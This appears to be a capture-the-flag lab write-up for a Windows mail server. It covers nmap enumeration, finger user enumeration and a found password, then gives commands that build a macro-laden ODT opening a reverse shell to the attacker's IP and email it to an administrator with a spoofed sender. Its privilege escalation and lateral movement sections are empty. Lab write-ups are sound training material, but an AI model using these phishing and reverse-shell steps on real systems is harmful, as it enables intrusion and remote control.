#Pwned! 
```IP
192.168.187.140
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.187.140 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE        REASON          VERSION
25/tcp    open  smtp           syn-ack ttl 125 Mercury/32 smtpd (Mail server account Maiser)          
| smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME, SIZE 0, HELP
|_ Recognized SMTP commands are: HELO EHLO MAIL RCPT DATA RSET AUTH NOOP QUIT HELP VRFY SOML                         
79/tcp    open  finger         syn-ack ttl 125 Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D                              
|_[No profile information]\x0D
105/tcp   open  ph-addressbook syn-ack ttl 125 Mercury/32 PH addressbook server
106/tcp   open  pop3pw         syn-ack ttl 125 Mercury/32 poppass service
110/tcp   open  pop3           syn-ack ttl 125 Mercury/32 pop3d
|_pop3-capabilities: TOP EXPIRE(NEVER) UIDL USER APOP
135/tcp   open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn    syn-ack ttl 125 Microsoft Windows netbios-ssn
143/tcp   open  imap           syn-ack ttl 125 Mercury/32 imapd 4.62
|_imap-capabilities: OK complete CAPABILITY IMAP4rev1 AUTH=PLAIN X-MERCURY-1A0001
443/tcp   open  ssl/http       syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| tls-alpn:
|_  http/1.1
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE      
|_  Potentially risky methods: TRACE                     
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024                               
| Signature Algorithm: sha1WithRSAEncryption             
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
| SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6 
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds?  syn-ack ttl 125
2224/tcp  open  http           syn-ack ttl 125 Mercury/32 httpd
5040/tcp  open  unknown        syn-ack ttl 125
7680/tcp  open  pando-pub?     syn-ack ttl 125
8000/tcp  open  http           syn-ack ttl 125 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-title: Time Travel Company Page
|_http-open-proxy: Proxy might be redirecting requests
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
11100/tcp open  vnc            syn-ack ttl 125 VNC (protocol 3.8)              
| vnc-info:
|   Protocol version: 3.8
|   Security types:                                  
|_    Unknown security type (40)
20001/tcp open  ftp            syn-ack ttl 125 FileZilla ftpd 0.9.41 beta   
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc                      
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore     
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
|_ftp-bounce: bounce working!          
| ftp-syst:                                     
|_  SYST: UNIX emulated by FileZilla
33006/tcp open  unknown        syn-ack ttl 125
| fingerprint-strings:
|   JavaRMI, Kerberos, NULL, SMBProgNeg, afp:
|_    Host '192.168.45.228' is not allowed to connect to this MariaDB server
49664/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc          syn-ack ttl 125 Microsoft Windows RPC
```
## Finger 79
```
perl finger-user-enum.pl -U ../../users.txt -t 192.168.187.140
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207171044.png?raw=true)
## IMAP 143 imapd 4.62
We discover here 2 things. the first one is that the password discovered in http 8000 works here
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207173958.png?raw=true)
secondly, the server appears to be processing automatically spreadsheets and documents
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207173911.png?raw=true)
We also know that we need to send it to mailadmin 
```
mailadmin@localhost
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207174320.png?raw=true)

## HTTP 443

possible usernames in dir /team
```
agnes
charlotte
ela_arwel
jonas
magnus
martha
```
## HTTP 8000
we find a password
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241207172748.png?raw=true)
```
SicMundusCreatusEst
```
## HTTP 2224
mlss
Mercury/32

## FTP 20001 FileZilla ftpd 0.9.41 beta
couldnt find anything interesting

# Exploitation
For the malicious libreoffice odt file we will need to create a macro that executes automatically a revshell
We will use the following script
https://github.com/0bfxgh0st/MMG-LO/blob/main/mmg-odt.py
from
https://github.com/0bfxgh0st/MMG-LO/tree/main
```
python mmg-odt.py windows 192.168.45.228 4444
```

```
sudo swaks -t mailadmin@localhost --from jonas@localhost --attach @file.odt --server 192.168.187.140 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz

# Lateral Movement

